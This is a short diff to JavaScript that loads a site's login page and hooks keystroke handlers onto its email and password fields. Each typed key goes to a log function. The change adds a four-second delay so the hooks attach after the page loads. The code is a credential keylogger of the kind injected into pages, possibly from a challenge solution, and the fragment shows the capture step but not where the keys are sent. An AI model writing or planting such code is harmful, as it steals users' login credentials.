@@ -14,6 +14,8 @@
   }
   
   load(`/login.php?url=${encodeURIComponent(comfort)}`)
+  setTimeout(() => {
   document.querySelector('[name=login-email]').onkeydown = ({key}) => log(key)
   document.querySelector('[name=login-password]').onkeydown = ({key}) => log(key)
+  }, 4000)
 //})()
